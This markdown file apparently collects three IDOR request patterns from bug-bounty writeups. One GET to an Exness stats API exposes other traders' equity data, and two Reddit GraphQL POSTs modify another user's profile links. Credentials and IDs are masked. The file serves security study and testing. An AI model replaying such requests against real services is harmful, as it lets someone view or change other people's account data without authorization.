# Payloads — idor

_Verbatim payload / request patterns extracted from findings in this repo. Nothing invented._

## 1. IDOR in Stats API Endpoint Allows Viewing Equity or Net Profit of Any MT Account
- Source: `telegram writeups (verbatim excerpts)`

```
GET /v3/personal_area/stats/equity?time_range=365&accounts=xxx HTTP/2
Host: my.exness.com
Authorization: Bearer xyz
Content-Type: application/json
```

## 2. IDOR allows an attacker to modify the links of any user
- Source: `telegram writeups (verbatim excerpts)`

```
POST / HTTP/2
Host: gql.reddit.com
Content-Length: 62
Sec-Ch-Ua: ".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"
X-Reddit-Loid:  * * ** * * * * * * * * * * ** * *  * * * * * * * * *  * * * * *  *
Sec-Ch-Ua-Mobile: ?0
Authorization: Bearer * * * * * * *  * * * * * * * * * * * * * * * * * * * * * * * * *  * * * * *  *
Content-Type: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/531.36
X-Reddit-Compression: 1
X-Reddit-Session:  * * * * * * * * *  * * * * *  * * * * * * * * * *  * * * * *  *
Sec-Ch-Ua-Platform: "Windows"
Accept: */*
Origin: https://www.reddit.com
Sec-Fetch-Site: same-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://www.reddit.com/
Accept-Encoding: gzip, deflate
Accept-Language: es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7,bs;q=0.6,ja;q=0.5

{"id":"11a239b07f86","variables":{"username":"*********"}}
```

## 3. IDOR allows an attacker to modify the links of any user
- Source: `telegram writeups (verbatim excerpts)`

```
POST / HTTP/2
Host: gql.reddit.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20000101 Firefox/101.0
Accept: */*
Accept-Language: es-AR,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/json
Content-Length: 173
X-Reddit-Loid: * * * * * * * * *  * * * * *  * * * * * * * * * *  * * * * *  *
X-Reddit-Session: * * * * * * * * *  * * * * *  * * * * * * * * * *  * * * * *  *
X-Reddit-Compression: 1
Origin: https://www.reddit.com
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
Authorization: Bearer * * * * * * * * *  * * * * *  * * * * * * * * * *  * * * * *  *
Referer: https://www.reddit.com/
Te: trailers

{"id":"c558e604581f","variables":{"input":{"socialLinks":[{"outboundUrl":"https://www.hackerone.com","title":"hacker","type":"CUSTOM","id":"* * * * * * * * *  * * * * *  * * * * * * * * * *  * * * * *  *"}]}}}
```
